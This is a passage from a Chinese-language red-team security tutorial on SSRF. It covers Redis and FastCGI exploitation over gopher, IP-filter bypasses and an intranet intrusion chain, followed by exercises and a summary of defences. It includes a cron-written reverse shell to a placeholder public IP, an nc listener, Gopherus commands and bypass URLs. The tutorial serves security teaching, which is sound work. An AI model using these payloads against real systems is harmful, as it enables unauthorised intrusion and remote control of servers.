CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET xxx "\n\n*/1 * * * * bash -i >& /dev/tcp/你的公网IP/4444 0>&1\n\n"
SAVE
```

转成gopher格式，
通过SSRF发送。

然后在你的公网服务器上监听：
```bash
nc -lvnp 4444
```

等一分钟，
Shell就弹过来了！

**方法4：Redis主从复制RCE**

如果是Redis 4.x以上版本，
还可以用主从复制RCE。

这个比较复杂，
但威力很大，
不需要知道Web目录，
不需要root权限。

有兴趣的同学可以自己研究一下。

---

### 案例3：Gopher协议打FastCGI

**场景描述：**
某服务器内网有PHP-FPM监听在9000端口，
通过SSRF + gopher协议打FastCGI，
直接命令执行。

**漏洞详情：**
- 目标存在SSRF
- 内网127.0.0.1:9000是PHP-FPM
- 支持gopher协议

**利用方法：**

用Gopherus工具生成payload：
```bash
python gopherus.py --exploit fastcgi
```

然后输入：
- 目标IP：127.0.0.1
- 目标端口：9000
- 要执行的命令：id
- PHP文件路径：/var/www/html/index.php（随便一个存在的PHP文件）

工具会生成gopher payload，
通过SSRF发送，
就能执行命令！

**原理：**
FastCGI协议是二进制的，
gopher可以发送任意TCP数据，
所以可以构造FastCGI协议的数据包，
让PHP-FPM执行任意代码。

这个比较高级，
大家了解一下就行。

---

### 案例4：绕过SSRF限制

**场景描述：**
某网站有图片加载功能，
做了SSRF防护，
过滤了127.0.0.1和内网IP，
只允许http协议。

**绕过过程：**

**第一步：测试基础的被拦了**
```
http://target.com/ssrf.php?url=http://127.0.0.1/
→ 返回"不允许访问本地地址"
```

**第二步：试试十进制IP**
```
http://target.com/ssrf.php?url=http://2130706433/
→ 成功访问了127.0.0.1！
```

绕过了！
因为过滤规则只认点分十进制的127.0.0.1，
不认纯数字的。

**第三步：试试内网IP的十进制**
```
# 192.168.1.1的十进制是3232235777
http://target.com/ssrf.php?url=http://3232235777/
→ 成功访问内网！
```

**第四步：试试其他协议**
```
http://target.com/ssrf.php?url=file:///etc/passwd
→ 不支持
```

```
http://target.com/ssrf.php?url=dict://127.0.0.1:6379/INFO
→ 成功！
```

dict协议没过滤！

**第五步：用dict打Redis**

然后就可以用dict协议打Redis了，
虽然没有gopher那么强大，
但也能干不少事。

**总结：**
SSRF的绕过就是不断尝试，
各种姿势都试试，
总有一款适合你！

---

### 案例5：从SSRF到内网渗透

**场景描述：**
护网行动中，
红队通过一个SSRF漏洞，
一步步打进内网，
最终拿下域控。

**攻击路径：**

**第一步：外网打点，发现SSRF**
- 对外网网站进行漏洞挖掘
- 发现一个"网页截图"功能存在SSRF
- 验证成功

**第二步：信息收集**
- 用file协议读/etc/passwd、读配置文件
- 读/proc/net/arp，发现内网网段
- 扫内网端口，发现大量存活主机

**第三步：发现Redis未授权**
- 扫到多台Redis未授权
- 用gopher打Redis，写计划任务反弹Shell
- 成功拿到第一台内网机器的Shell

**第四步：内网信息收集**
- 在第一台机器上收集信息
- 发现域环境
- 抓取密码哈希
- 发现其他内网服务

**第五步：横向移动**
- 用抓到的密码哈希Pass The Hash
- 登录更多机器
- 继续收集信息
- 扩大战果

**第六步：拿下域控**
- 找到域管理员的凭据
- 登录域控
- 任务完成！

**总结：**
一个SSRF漏洞，
打开了整个内网的大门，
最终拿下域控。

这就是SSRF在护网中的威力！

---

## ✏️ 课后习题

### 选择题

1. SSRF的全称是什么？
   - A. Cross-Site Request Forgery
   - B. Server-Side Request Forgery
   - C. Cross-Site Scripting
   - D. Server-Side Scripting

2. SSRF的核心是什么？
   - A. 让用户浏览器发请求
   - B. 让服务器发起攻击者指定的请求
   - C. 注入恶意脚本
   - D. 篡改网页内容

3. 以下哪个协议最适合用来通过SSRF攻击Redis？
   - A. http
   - B. file
   - C. gopher
   - D. ftp

4. 要读取服务器本地的/etc/passwd文件，应该用哪个协议？
   - A. http
   - B. file
   - C. dict
   - D. gopher

5. 以下哪个是SSRF的危害？
   - A. 偷用户Cookie
   - B. 修改用户密码
   - C. 探测和攻击内网
   - D. 挂马

6. 127.0.0.1的十进制表示是什么？
   - A. 127001
   - B. 2130706433
   - C. 0x7f000001
   - D. 017700000001

7. 以下哪个不是SSRF常见的触发场景？
   - A. 图片远程加载
   - B. 网页爬虫/采集
   - C. 用户登录
   - D. 在线翻译

8. SSRF和CSRF的主要区别是什么？
   - A. 没区别，都是请求伪造
   - B. SSRF是服务端问题，CSRF是客户端问题
   - C. CSRF比SSRF危害大
   - D. SSRF只能读文件

9. 云环境中，SSRF常用来获取什么？
   - A. 用户密码
   - B. 元数据（Instance Metadata）
   - C. 数据库
   - D. 管理员账号

10. 以下哪种方法不能用来绕过SSRF的IP过滤？
    - A. IP转十进制
    - B. 用解析到内网的域名
    - C. 302跳转
    - D. 用HTTPS协议

### 填空题

1. SSRF的中文全称是 _______。

2. SSRF中，能发送任意TCP数据的协议是 _______ 协议。

3. 读取本地文件需要用 _______ 协议。

4. 127.0.0.1的十六进制表示是 _______。

5. SSRF + _______ 未授权访问是经典的组合利用。

6. 云服务（如AWS）的元数据服务IP是 _______。

7. dict协议的作用是 _______。

8. SSRF中扫描内网端口的原理是根据 _______ 和 _______ 判断端口是否开放。

### 简答题

1. 简述SSRF漏洞的原理。
2. SSRF和CSRF有什么区别？
3. SSRF能做什么？列举至少5种利用方式。
4. 列举至少3种SSRF绕过IP过滤的方法。
5. 列举至少3种SSRF的防御措施。
6. Gopher协议为什么这么强大？它能做什么？
7. SSRF + Redis未授权能做什么？列举3种利用方式。
8. 为什么SSRF在护网行动中很重要？

### 实操题

1. 在DVWA或Pikachu靶场中练习SSRF漏洞。
2. 练习用file协议读取本地文件。
3. 练习用SSRF扫描内网端口。
4. 了解Gopherus工具的使用，练习生成Redis的gopher payload。
5. 自己搭建一个有SSRF漏洞的简单环境（比如PHP的file_get_contents），然后练习各种利用。
6. 尝试各种SSRF绕过姿势（进制转换、特殊域名等）。

---

## 📝 本章小结

这一章我们学习了SSRF服务端请求伪造漏洞，
内容非常丰富，
而且非常实用，
让我们来总结一下：

### 核心概念
- **SSRF（服务端请求伪造）**：让服务器发起攻击者指定的请求
- **原理**：攻击者控制URL参数，服务器去访问攻击者指定的地址
- **核心价值**：从外网访问内网，相当于站在服务器的位置

### SSRF vs CSRF
- **CSRF**：客户端问题，让用户浏览器发请求，借用户身份
- **SSRF**：服务端问题，让服务器发请求，访问内网
- 两者完全不同，不要搞混

### SSRF的危害
- 探测内网（扫端口、扫存活主机）
- 读取本地文件（file协议）
- 攻击内网服务（Redis、MySQL、FastCGI等）
- 云环境获取元数据
- 作为内网渗透的跳板

### 常见触发场景
- 图片加载/下载
- 文章采集/爬虫
- 在线翻译/转码/截图
- URL检测
- 远程头像上传
- 等等...只要是服务器访问URL的地方

### 协议利用
- **http/https**：最基础，扫端口、打内网Web
- **file**：读本地文件
- **dict**：探测服务、简单命令
- **gopher**：神器！能发任意TCP数据，打各种服务

### Gopher协议
- 格式：`gopher://host:port/_数据`
- 可以打Redis、MySQL、FastCGI等
- 配合Gopherus工具使用

### SSRF绕过
- IP进制转换（十进制、八进制、十六进制）
- 特殊域名（解析到127.0.0.1的域名）
- IPv6（[::1]）
- 302跳转
- DNS重绑定
- URL解析差异
- 等等...

### 防御措施
- 协议限制（只允许必要协议）
- 域名白名单
- 内网IP过滤
- 不返回响应内容
- 统一错误信息
- 权限最小化
- 纵深防御

### 经典组合
- **SSRF + Redis未授权** → 写Shell、写公钥、写计划任务
- **SSRF + 内网Web漏洞** → 打内网的各种漏洞
- **SSRF + FastCGI** → 命令执行

SSRF是一个非常重要的漏洞，
在护网中经常作为打点的突破口，
大家一定要掌握好！

下一章我们会对CSRF和SSRF做一个总结，
然后进入逻辑漏洞模块，
敬请期待！

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day037-advanced-CSRF跨站请求伪造)
- [➡️ 下一章：---](/redteam/day039-advanced-CSRF与SSRF总结)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
